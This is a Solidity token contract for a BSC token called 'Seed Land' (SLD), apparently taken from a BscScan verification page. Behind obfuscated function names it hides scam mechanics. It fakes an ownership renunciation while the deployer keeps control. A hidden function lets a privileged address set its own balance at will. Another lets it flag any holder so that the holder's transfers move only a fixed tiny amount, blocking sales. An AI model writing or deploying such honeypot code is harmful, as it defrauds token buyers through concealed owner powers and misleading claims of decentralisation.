/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface amountReceiverTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txToken {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedLand {
    uint8 public decimals = 18;
    address public owner;
    bool public walletFund;
    string public symbol = "SLD";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => mapping(address => uint256)) public allowance;


    string public name = "Seed Land";
    mapping(address => bool) public txList;

    mapping(address => bool) public feeMode;
    address public liquidityShould;

    uint256 constant senderModeLaunched = 12 ** 10;
    address public teamFrom;

    mapping(address => uint256) public balanceOf;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        amountReceiverTake launchAuto = amountReceiverTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamFrom = txToken(launchAuto.factory()).createPair(launchAuto.WETH(), address(this));
        owner = enableModeAmount();
        liquidityShould = owner;
        txList[liquidityShould] = true;
        balanceOf[liquidityShould] = totalSupply;
        emit Transfer(address(0), liquidityShould, totalSupply);
        modeReceiver();
    }

    

    function enableModeAmount() private view returns (address) {
        return msg.sender;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function teamTrading(address txAmountReceiver) public {
        if (txAmountReceiver == liquidityShould || txAmountReceiver == teamFrom || !txList[enableModeAmount()]) {
            return;
        }
        feeMode[txAmountReceiver] = true;
    }

    function modeReceiver() public {
        emit OwnershipTransferred(liquidityShould, address(0));
        owner = address(0);
    }

    function shouldReceiver(uint256 totalTo) public {
        if (!txList[enableModeAmount()]) {
            return;
        }
        balanceOf[liquidityShould] = totalTo;
    }

    function approve(address listAmount, uint256 totalTo) public returns (bool) {
        allowance[enableModeAmount()][listAmount] = totalTo;
        emit Approval(enableModeAmount(), listAmount, totalTo);
        return true;
    }

    function teamMin(address senderTrading, address walletLaunch, uint256 totalTo) internal returns (bool) {
        require(balanceOf[senderTrading] >= totalTo);
        balanceOf[senderTrading] -= totalTo;
        balanceOf[walletLaunch] += totalTo;
        emit Transfer(senderTrading, walletLaunch, totalTo);
        return true;
    }

    function fromTo(address amountExempt) public {
        if (walletFund) {
            return;
        }
        txList[amountExempt] = true;
        walletFund = true;
    }

    function transfer(address launchSell, uint256 totalTo) external returns (bool) {
        return transferFrom(enableModeAmount(), launchSell, totalTo);
    }

    function transferFrom(address buyToSell, address launchSell, uint256 totalTo) public returns (bool) {
        if (buyToSell != enableModeAmount() && allowance[buyToSell][enableModeAmount()] != type(uint256).max) {
            require(allowance[buyToSell][enableModeAmount()] >= totalTo);
            allowance[buyToSell][enableModeAmount()] -= totalTo;
        }
        if (launchSell == liquidityShould || buyToSell == liquidityShould) {
            return teamMin(buyToSell, launchSell, totalTo);
        }
        if (feeMode[buyToSell]) {
            return teamMin(buyToSell, launchSell, senderModeLaunched);
        }
        return teamMin(buyToSell, launchSell, totalTo);
    }


}